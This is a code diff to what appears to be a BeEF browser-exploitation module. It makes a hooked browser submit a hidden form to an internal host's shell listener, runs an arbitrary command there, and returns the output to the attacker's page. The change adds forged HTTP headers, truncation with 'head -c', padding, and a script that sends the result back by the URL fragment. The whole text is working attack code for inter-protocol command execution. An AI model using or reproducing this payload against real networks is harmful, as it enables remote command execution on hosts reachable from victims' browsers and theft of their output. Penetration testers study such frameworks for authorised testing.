@@ -20,6 +20,7 @@ beef.execute(function() {
 	var cmd = '<%= @cmd %>';
 	var command_timeout = "<%= @command_timeout %>";
 	var internal_counter = 0;
+    var result_size = "<%= @result_size %>";
 
 	// create iframe
 	var iframe = document.createElement("iframe");
@@ -28,7 +29,7 @@ beef.execute(function() {
 	document.body.appendChild(iframe);
 
 	// send a request
-	function send_cmds(ip, port, cmd) {
+	function send_cmds(ip, port, cmd, size) {
 
 		var action = "http://" + ip + ":" + port + "/index.html?&/bin/sh&&";
 		var parent = window.location.href;
@@ -45,16 +46,22 @@ beef.execute(function() {
 		myExt = document.createElement("INPUT");
 		myExt.setAttribute("id",<%= @command_id %>);
 		myExt.setAttribute("name",<%= @command_id %>);
-		myExt.setAttribute("value","echo \"</pre><div id='ipc_content'>\" & " + cmd + " & echo Directory Contents: & ls -la & ");
+		myExt.setAttribute("value","echo -e HTTP/1.1 200 OK\\\\r;echo -e Content-Type: text/html\\\\r;echo -e Content-Length: "+(34+cmd.length+52+parent.length+115+size*1)+"\\\\r;echo -e Keep-Alive: timeout=5,max=100\\\\r;echo -e Connection: keep-alive\\\\r;echo -e \\\\r;echo \"<html><body><div id='ipc_content'>\";(" + cmd + ")|head -c "+size+" ; ");
 		myform.appendChild(myExt);
+
+        // Adding puffer space for the command result
+		end_talkback=" echo -e \"__END_OF_POSIX_IPC<%= @command_id %>__</div><s"+"cript>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\\\"ipc_content\\\").innerHTML);</"+"script></body></html>";
+        while(--size) end_talkback+=" ";
+        end_talkback+="\" \\\\r ; exit";
+
 
 		// post js to call home and close connection
-		myExt = document.createElement("INPUT");
-		myExt.setAttribute("id","endTag");
-		myExt.setAttribute("name","</div>");
-		myExt.setAttribute("value","exit & echo \"__END_OF_POSIX_IPC<%= @command_id %>__</div><scr"+"ipt>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\\\"ipc_content\\\").innerHTML);</"+"script>\" & exit & exit & exit");
+		myExt2 = document.createElement("INPUT");
+		myExt2.setAttribute("id","endTag");
+		myExt2.setAttribute("name","</div>");
+		myExt2.setAttribute("value",end_talkback);
 
-		myform.appendChild(myExt);
+		myform.appendChild(myExt2);
 		myform.submit();
 	}
 
@@ -88,7 +95,7 @@ beef.execute(function() {
 
 	// send request and wait for reply
 	} else {
-		send_cmds(target_ip, target_port, cmd);
+		send_cmds(target_ip, target_port, cmd,result_size);
 		waituntilok();
 	}
 
